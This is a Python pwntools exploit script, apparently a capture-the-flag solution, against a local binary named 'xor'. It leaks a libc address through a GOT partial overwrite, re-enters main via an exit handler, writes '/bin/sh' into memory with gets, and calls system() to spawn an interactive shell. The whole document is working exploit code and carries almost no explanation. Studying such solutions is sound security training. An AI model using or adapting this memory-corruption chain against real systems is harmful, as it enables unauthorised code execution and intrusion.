#!/usr/bin/env python3

from pwn import *

exe = ELF("./xor")
libc = ELF("./libc.so.6")

context.binary = exe


io = process("./xor")

# leak libc by printing a GOT entry via a partial overwrite (throw goes from err() to warn())
payload = b'\n' + b'A'*63 + p64(exe.got["err"])*2 + b"\x10\x10"
io.send(payload)

io.recvuntil(b": ")
leak = u64(io.recv(6).ljust(8, b'\0'))
libc.address = leak - libc.sym["err"]
log.info(f"libc @ {hex(libc.address)}")

payload = b'\n' + b'A'*31 + flat(1, exe.sym["main"], libc.sym["__cxa_atexit"])
io.send(payload)
log.info("Registered main as an exit handler, starting again")

# read '/bin/sh' into memory so we can use it to call system()
payload = b'\n' + b'A'*63 + flat(1, exe.bss(0x100), libc.sym["gets"])
io.send(payload)
io.sendline(b"/bin/sh")

# finally, call system()
payload = b'\n' + b'A'*31 + flat(1, exe.bss(0x100), libc.sym["system"])
io.send(payload)

io.interactive()
